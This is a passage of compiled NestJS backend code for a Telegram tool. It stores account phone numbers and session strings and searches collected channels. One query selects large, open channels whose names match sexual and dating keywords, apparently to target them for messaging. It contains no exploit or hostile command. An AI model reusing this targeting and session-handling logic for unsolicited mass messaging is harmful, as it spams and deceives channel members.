class UpdateBufferClientDto extends (0, swagger_1.PartialType)(create_buffer_client_dto_1.CreateBufferClientDto) {
}
exports.UpdateBufferClientDto = UpdateBufferClientDto;


/***/ }),

/***/ "./src/components/buffer-clients/schemas/buffer-client.schema.ts":
/*!***********************************************************************!*\
  !*** ./src/components/buffer-clients/schemas/buffer-client.schema.ts ***!
  \***********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientSchema = exports.BufferClient = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
let BufferClient = class BufferClient {
};
exports.BufferClient = BufferClient;
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], BufferClient.prototype, "tgId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], BufferClient.prototype, "mobile", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], BufferClient.prototype, "session", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], BufferClient.prototype, "availableDate", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, type: Number }),
    __metadata("design:type", Number)
], BufferClient.prototype, "channels", void 0);
exports.BufferClient = BufferClient = __decorate([
    (0, mongoose_1.Schema)({ collection: 'bufferClients', versionKey: false, autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], BufferClient);
exports.BufferClientSchema = mongoose_1.SchemaFactory.createForClass(BufferClient);


/***/ }),

/***/ "./src/components/builds/build.controller.ts":
/*!***************************************************!*\
  !*** ./src/components/builds/build.controller.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BuildController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const build_service_1 = __webpack_require__(/*! ./build.service */ "./src/components/builds/build.service.ts");
let BuildController = class BuildController {
    constructor(buildService) {
        this.buildService = buildService;
    }
    async findOne() {
        return this.buildService.findOne();
    }
    async update(updateClientDto) {
        return this.buildService.update(updateClientDto);
    }
};
exports.BuildController = BuildController;
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get build data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BuildController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update build' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], BuildController.prototype, "update", null);
exports.BuildController = BuildController = __decorate([
    (0, swagger_1.ApiTags)('Build'),
    (0, common_1.Controller)('builds'),
    __metadata("design:paramtypes", [build_service_1.BuildService])
], BuildController);


/***/ }),

/***/ "./src/components/builds/build.module.ts":
/*!***********************************************!*\
  !*** ./src/components/builds/build.module.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BuildModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const build_service_1 = __webpack_require__(/*! ./build.service */ "./src/components/builds/build.service.ts");
const build_controller_1 = __webpack_require__(/*! ./build.controller */ "./src/components/builds/build.controller.ts");
const builds_schema_1 = __webpack_require__(/*! ./builds.schema */ "./src/components/builds/builds.schema.ts");
const npoint_module_1 = __webpack_require__(/*! ../n-point/npoint.module */ "./src/components/n-point/npoint.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let BuildModule = class BuildModule {
};
exports.BuildModule = BuildModule;
exports.BuildModule = BuildModule = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            BuildModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'buildModule', collection: 'builds', schema: builds_schema_1.BuildSchema }]),
            npoint_module_1.NpointModule,
        ],
        providers: [build_service_1.BuildService],
        controllers: [build_controller_1.BuildController],
        exports: [BuildModule],
    })
], BuildModule);


/***/ }),

/***/ "./src/components/builds/build.service.ts":
/*!************************************************!*\
  !*** ./src/components/builds/build.service.ts ***!
  \************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BuildService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const npoint_service_1 = __webpack_require__(/*! ../n-point/npoint.service */ "./src/components/n-point/npoint.service.ts");
let BuildService = class BuildService {
    constructor(buildModel, npointSerive) {
        this.buildModel = buildModel;
        this.npointSerive = npointSerive;
    }
    async OnModuleInit() {
        console.log("Config Module Inited");
    }
    async findOne() {
        const user = await this.buildModel.findOne({}).exec();
        if (!user) {
            throw new common_1.NotFoundException(`buildModel not found`);
        }
        return user;
    }
    async update(updateClientDto) {
        delete updateClientDto['_id'];
        const updatedUser = await this.buildModel.findOneAndUpdate({}, { $set: { ...updateClientDto } }, { new: true, upsert: true }).exec();
        try {
            await this.npointSerive.updateDocument("3375d15db1eece560188", updatedUser);
            console.log("Updated document successfully in npoint");
        }
        catch (error) {
            console.log(error);
        }
        if (!updatedUser) {
            throw new common_1.NotFoundException(`buildModel not found`);
        }
        return updatedUser;
    }
};
exports.BuildService = BuildService;
exports.BuildService = BuildService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('buildModule')),
    __metadata("design:paramtypes", [mongoose_2.Model,
        npoint_service_1.NpointService])
], BuildService);


/***/ }),

/***/ "./src/components/builds/builds.schema.ts":
/*!************************************************!*\
  !*** ./src/components/builds/builds.schema.ts ***!
  \************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BuildSchema = exports.Build = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let Build = class Build {
};
exports.Build = Build;
exports.Build = Build = __decorate([
    (0, mongoose_1.Schema)({ versionKey: false, autoIndex: true, strict: false, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        }, })
], Build);
exports.BuildSchema = mongoose_1.SchemaFactory.createForClass(Build);
exports.BuildSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/channels/channels.controller.ts":
/*!********************************************************!*\
  !*** ./src/components/channels/channels.controller.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ChannelsController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const channels_service_1 = __webpack_require__(/*! ./channels.service */ "./src/components/channels/channels.service.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const search_channel_dto_1 = __webpack_require__(/*! ./dto/search-channel.dto */ "./src/components/channels/dto/search-channel.dto.ts");
const create_channel_dto_1 = __webpack_require__(/*! ./dto/create-channel.dto */ "./src/components/channels/dto/create-channel.dto.ts");
const update_channel_dto_1 = __webpack_require__(/*! ./dto/update-channel.dto */ "./src/components/channels/dto/update-channel.dto.ts");
let ChannelsController = class ChannelsController {
    constructor(channelsService) {
        this.channelsService = channelsService;
    }
    async create(createChannelDto) {
        return this.channelsService.create(createChannelDto);
    }
    async createMultiple(createChannelDtos) {
        return this.channelsService.createMultiple(createChannelDtos);
    }
    search(query) {
        console.log(query);
        return this.channelsService.search(query);
    }
    async findAll() {
        return this.channelsService.findAll();
    }
    async findOne(channelId) {
        return this.channelsService.findOne(channelId);
    }
    async update(channelId, updateChannelDto) {
        return this.channelsService.update(channelId, updateChannelDto);
    }
    async remove(channelId) {
        return this.channelsService.remove(channelId);
    }
};
exports.ChannelsController = ChannelsController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new  channel' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_channel_dto_1.CreateChannelDto]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "create", null);
__decorate([
    (0, common_1.Post)('createMultiple'),
    (0, swagger_1.ApiOperation)({ summary: 'Create multiple channels' }),
    (0, swagger_1.ApiBody)({ type: [create_channel_dto_1.CreateChannelDto] }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Array]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "createMultiple", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search channels by filters' }),
    (0, swagger_1.ApiQuery)({ name: 'channelId', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'broadcast', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'canSendMsgs', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'participantsCount', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'restricted', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'sendMessages', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'title', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'username', required: false, type: String }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_channel_dto_1.SearchChannelDto]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all  channels' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get an  channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update an  channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_channel_dto_1.UpdateChannelDto]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete an  channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "remove", null);
exports.ChannelsController = ChannelsController = __decorate([
    (0, swagger_1.ApiTags)('Channels'),
    (0, common_1.Controller)('channels'),
    __metadata("design:paramtypes", [channels_service_1.ChannelsService])
], ChannelsController);


/***/ }),

/***/ "./src/components/channels/channels.module.ts":
/*!****************************************************!*\
  !*** ./src/components/channels/channels.module.ts ***!
  \****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ChannelsModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const channels_service_1 = __webpack_require__(/*! ./channels.service */ "./src/components/channels/channels.service.ts");
const channels_controller_1 = __webpack_require__(/*! ./channels.controller */ "./src/components/channels/channels.controller.ts");
const channel_schema_1 = __webpack_require__(/*! ./schemas/channel.schema */ "./src/components/channels/schemas/channel.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let ChannelsModule = class ChannelsModule {
};
exports.ChannelsModule = ChannelsModule;
exports.ChannelsModule = ChannelsModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: channel_schema_1.Channel.name, schema: channel_schema_1.ChannelSchema }]),
        ],
        controllers: [channels_controller_1.ChannelsController],
        providers: [channels_service_1.ChannelsService],
        exports: [channels_service_1.ChannelsService]
    })
], ChannelsModule);


/***/ }),

/***/ "./src/components/channels/channels.service.ts":
/*!*****************************************************!*\
  !*** ./src/components/channels/channels.service.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ChannelsService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const channel_schema_1 = __webpack_require__(/*! ./schemas/channel.schema */ "./src/components/channels/schemas/channel.schema.ts");
let ChannelsService = class ChannelsService {
    constructor(ChannelModel) {
        this.ChannelModel = ChannelModel;
        console.log(channel_schema_1.Channel.name);
    }
    async create(createChannelDto) {
        const createdChannel = new this.ChannelModel(createChannelDto);
        return createdChannel.save();
    }
    async createMultiple(createChannelDtos) {
        const bulkOps = createChannelDtos.map((dto) => ({
            updateOne: {
                filter: { channelId: dto.channelId },
                update: { $set: dto },
                upsert: true
            }
        }));
        await this.ChannelModel.bulkWrite(bulkOps, { ordered: false });
        return 'Channels Saved';
    }
    async findAll() {
        return this.ChannelModel.find().exec();
    }
    async findOne(channelId) {
        const channel = (await this.ChannelModel.findOne({ channelId }).exec())?.toJSON();
        return channel;
    }
    async update(channelId, updateChannelDto) {
        const updatedChannel = await this.ChannelModel.findOneAndUpdate({ channelId }, { $set: updateChannelDto }, { new: true, upsert: true }).exec();
        return updatedChannel;
    }
    async remove(channelId) {
        const result = await this.ChannelModel.findOneAndDelete({ channelId }).exec();
    }
    async search(filter) {
        console.log(filter);
        return this.ChannelModel.find(filter).exec();
    }
    async getChannels(limit = 50, skip = 0, keywords = [], notIds = []) {
        const pattern = new RegExp(keywords.join('|'), 'i');
        const notPattern = new RegExp('online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', "i");
        let query = {
            $and: [
                { username: { $ne: null } },
                {
                    $or: [
                        { title: { $regex: pattern } },
                        { username: { $regex: pattern } }
                    ]
                },
                {
                    username: {
                        $not: {
                            $regex: "^(" + notIds.map(id => "(?i)" + id?.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'))?.join("|") + ")$"
                        }
                    }
                },
                {
                    title: { $not: { $regex: notPattern } }
                },
                {
                    username: { $not: { $regex: notPattern } }
                },
                {
                    sendMessages: false,
                    broadcast: false,
                    restricted: false
                }
            ]
        };
        const sort = { participantsCount: "desc" };
        try {
            const result = await this.ChannelModel.find(query).sort(sort).skip(skip).limit(limit).exec();
            return result;
        }
        catch (error) {
            console.error('Error:', error);
            return [];
        }
    }
    async executeQuery(query, sort, limit) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.ChannelModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async getActiveChannels(limit = 50, skip = 0, notIds = []) {
        const query = {
            '$and': [
                {
                    '$or': [
                        { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },
                        { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },
                    ]
                },
                {
                    '$or': [
                        { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },
                        { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },
                    ]
                },
                {
                    channelId: { '$nin': notIds },
                    participantsCount: { $gt: 1000 },
                    username: { $ne: null },
                    canSendMsgs: true,
                    restricted: false,
                    forbidden: false
                }
            ]
        };
        const sort = notIds.length > 300 && false ? 0 : { participantsCount: -1 };
        try {
            const result = await this.ChannelModel.aggregate([
                { $match: query },
                { $skip: skip },
                { $limit: limit },
                { $addFields: { randomField: { $rand: {} } } },
                { $sort: sort },
                { $project: { randomField: 0 } }
            ]).exec();
            return result;
        }
        catch (error) {
            console.error('Error:', error);
            return [];
        }
    }
};
exports.ChannelsService = ChannelsService;
exports.ChannelsService = ChannelsService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(channel_schema_1.Channel.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], ChannelsService);


/***/ }),

/***/ "./src/components/channels/dto/create-channel.dto.ts":
/*!***********************************************************!*\
  !*** ./src/components/channels/dto/create-channel.dto.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateChannelDto {
    constructor() {
        this.private = false;
        this.forbidden = false;
    }
}
exports.CreateChannelDto = CreateChannelDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Unique identifier for the channel',
        example: '803387987',
    }),
    __metadata("design:type", String)
], CreateChannelDto.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is a broadcast channel',
        example: null,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "broadcast", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Indicates if the channel can send messages',
        example: true,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "canSendMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is a megagroup',
        example: null,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Number of participants in the channel',
        example: 0,
    }),
    __metadata("design:type", Number)
], CreateChannelDto.prototype, "participantsCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is restricted',
        example: null,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "restricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel can send messages',
        example: null,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "sendMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Title of the channel',
        example: 'Earn money with Ayesha',
    }),
    __metadata("design:type", String)
], CreateChannelDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Username of the channel',
        example: null,
        required: false,
    }),
    __metadata("design:type", String)
], CreateChannelDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is private',
        example: false,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "private", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        default: false, example: false,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "forbidden", void 0);


/***/ }),

/***/ "./src/components/channels/dto/search-channel.dto.ts":
/*!***********************************************************!*\
  !*** ./src/components/channels/dto/search-channel.dto.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class SearchChannelDto {
}
exports.SearchChannelDto = SearchChannelDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Unique identifier for the channel',
        example: '803387987',
    }),
    __metadata("design:type", String)
], SearchChannelDto.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Title of the channel',
        example: 'Earn money with Ayesha',
    }),
    __metadata("design:type", String)
], SearchChannelDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'privacy of the channel',
        example: false,
    }),
    __metadata("design:type", String)
], SearchChannelDto.prototype, "private", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Username of the channel',
        example: 'ayesha_channel',
    }),
    __metadata("design:type", String)
], SearchChannelDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Indicates if the channel can send messages',
        example: true,
    }),
    __metadata("design:type", Boolean)
], SearchChannelDto.prototype, "canSendMsgs", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Minimum number of participants in the channel',
        example: 10,
    }),
    __metadata("design:type", Number)
], SearchChannelDto.prototype, "minParticipantsCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Maximum number of participants in the channel',
        example: 100,
    }),
    __metadata("design:type", Number)
], SearchChannelDto.prototype, "maxParticipantsCount", void 0);


/***/ }),

/***/ "./src/components/channels/dto/update-channel.dto.ts":
